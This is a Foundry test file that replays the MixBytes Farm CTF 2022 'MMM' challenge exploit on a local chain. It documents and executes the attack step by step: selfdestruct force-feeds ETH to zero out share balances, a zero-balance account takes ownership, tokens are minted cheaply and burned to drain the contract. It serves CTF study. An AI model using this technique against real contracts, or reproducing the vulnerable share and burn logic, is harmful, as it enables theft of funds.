// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../contracts/MMM/ProfitableBusiness.sol";
import "../contracts/MMM/ProfitableBusinessAttack.sol";

/// @title ProfitableBusiness ("MMM") majority-owner takeover exploit reproduction
/// @notice MixBytes Farm CTF (2022) - "MMM" challenge, replayed locally
///         against a vm-managed chain since the original Goerli testnet is gone.
/// @dev This reproduces the exploit that was originally run as a script
///      against Goerli:
///
///      1. `ethTotalSupply()` returns the raw `address(this).balance`, with no
///         protection against ETH being pushed into the contract outside of
///         `mint()`.
///      2. `shares(user) = balanceOf(user) * base / ethTotalSupply()` therefore
///         depends directly on `address(this).balance`.
///      3. `ProfitableBusinessAttack.hack()` calls `selfdestruct(mmm)`, forcibly
///         teleporting the attack contract's ETH balance into
///         ProfitableBusiness without invoking `receive`/`fallback` and without
///         minting any tokens. This spikes `ethTotalSupply()`, collapsing
///         `shares()` for every existing holder (including the current owner)
///         towards zero via integer division.
///      4. `changeMajorityOwner()` only requires
///         `shares(msg.sender) >= shares(owner())`. Once the owner's shares
///         collapse to 0, an attacker holding 0 tokens (shares == 0 too)
///         satisfies `0 >= 0` and becomes the new owner.
///      5. As the new owner, the attacker calls
///         `enhanceDepositProfitability(largeProfitability, 1)`, making
///         `mint()` issue a massively disproportionate amount of tokens per
///         wei deposited.
///      6. The attacker calls `mint{value: 1}()` and receives a huge token
///         balance.
///      7. `burn(amount)` only checks `amount <= ethTotalSupply()` (the
///         contract's current wei balance) and then pays out `amount` wei
///         1:1, without rescaling through profitability/base. The attacker
///         burns `amount == ethTotalSupply()`, draining 100% of the
///         contract's ETH.
///
/// @dev ProfitableBusiness.sol and ProfitableBusinessAttack.sol are
///      intentionally vulnerable / pre-written challenge contracts and are
///      NOT modified by this test.
contract ProfitableBusinessTest is Test {
    ProfitableBusiness mmm;
    ProfitableBusinessAttack attack;

    address deployer;
    address player;

    // Initial "honest" deposit made by the deployer/owner before the attack,
    // establishing a realistic starting ETH balance for the contract.
    uint256 constant OWNER_DEPOSIT = 10 ** 8;

    // ETH balance given to the attack contract ahead of time, later forced
    // into ProfitableBusiness via selfdestruct.
    uint256 constant ATTACK_BALANCE = 10 ** 15; // 0.001 ether

    function setUp() public {
        deployer = makeAddr("deployer");
        player = makeAddr("player");

        // Deploy ProfitableBusiness; `deployer` becomes its Ownable owner.
        vm.prank(deployer);
        mmm = new ProfitableBusiness();

        // Deploy the pre-written attack contract; `player` becomes its owner
        // and is therefore the only account allowed to call `hack()`.
        vm.prank(player);
        attack = new ProfitableBusinessAttack();

        // --- Scene setup: a realistic pre-attack state --------------------
        // The owner first grants itself a fair 1:1 deposit rate, deposits
        // OWNER_DEPOSIT wei and receives OWNER_DEPOSIT tokens honestly...
        vm.prank(deployer);
        mmm.enhanceDepositProfitability(1, 1);

        vm.deal(deployer, OWNER_DEPOSIT);
        vm.prank(deployer);
        mmm.mint{value: OWNER_DEPOSIT}();

        // ...then restores the (deliberately unfavourable, per the original
        // README) default deposit rate of profitability=100 / base=1000000.
        vm.prank(deployer);
        mmm.enhanceDepositProfitability(100, 1000000);

        // Fund the attack contract so it has something to selfdestruct.
        vm.deal(address(attack), ATTACK_BALANCE);
    }

    function test_TakeoverAndDrainViaForcedSelfdestruct() public {
        console.log("=== Initial state ===");
        console.log("mmm balance        :", address(mmm).balance);
        console.log("shares(deployer)   :", mmm.shares(deployer));
        console.log("shares(player)     :", mmm.shares(player));
        console.log("owner()            :", mmm.owner());

        assertEq(address(mmm).balance, OWNER_DEPOSIT, "mmm should start funded with the owner's honest deposit");
        assertEq(mmm.owner(), deployer, "deployer should be the initial owner");
        assertGt(mmm.shares(deployer), 0, "deployer should hold a non-zero share before the attack");

        // --- Step 1: force-feed ETH via selfdestruct -----------------------
        // This spikes ethTotalSupply() without minting any tokens, crashing
        // shares() for every holder (including the owner) via integer
        // division.
        vm.prank(player);
        attack.hack(payable(address(mmm)));

        console.log("=== After selfdestruct force-feed ===");
        console.log("mmm balance        :", address(mmm).balance);
        console.log("shares(deployer)   :", mmm.shares(deployer));
        console.log("shares(player)     :", mmm.shares(player));

        assertEq(
            address(mmm).balance,
            OWNER_DEPOSIT + ATTACK_BALANCE,
            "mmm balance should include the forcibly transferred ETH"
        );
        assertEq(mmm.shares(deployer), 0, "owner's shares should collapse to 0 after the forced deposit");
        assertEq(mmm.shares(player), 0, "player still holds 0 tokens, so shares are also 0");

        // --- Step 2: take over ownership -----------------------------------
        // shares(player) (0) >= shares(owner()) (0) now holds, so the
        // zero-balance attacker becomes the new majority owner.
        vm.prank(player);
        mmm.changeMajorityOwner();

        console.log("=== After changeMajorityOwner ===");
        console.log("owner()            :", mmm.owner());
        assertEq(mmm.owner(), player, "player should now be the owner");

        // --- Step 3: set a hugely favourable deposit rate ------------------
        vm.prank(player);
        mmm.enhanceDepositProfitability(10 ** 18, 1);

        console.log("profitability      :", mmm.profitability());
        console.log("base               :", mmm.base());

        // --- Step 4: mint a disproportionate amount of tokens for 1 wei ----
        vm.deal(player, 1);
        vm.prank(player);
        mmm.mint{value: 1}();

        console.log("=== After cheap mint ===");
        console.log("player token balance:", mmm.balanceOf(player));
        assertEq(mmm.balanceOf(player), 10 ** 18, "player should have minted 10**18 tokens for 1 wei");

        // --- Step 5: burn to drain all ETH held by the contract ------------
        uint256 totalEthBeforeBurn = mmm.ethTotalSupply();
        console.log("mmm balance pre-burn:", totalEthBeforeBurn);

        vm.prank(player);
        mmm.burn(totalEthBeforeBurn);

        console.log("=== Final state ===");
        console.log("mmm balance        :", address(mmm).balance);
        console.log("player ETH balance :", player.balance);

        assertEq(address(mmm).balance, 0, "ProfitableBusiness should be fully drained of ETH");
        assertEq(player.balance, totalEthBeforeBurn, "player should have received all drained ETH");
    }
}
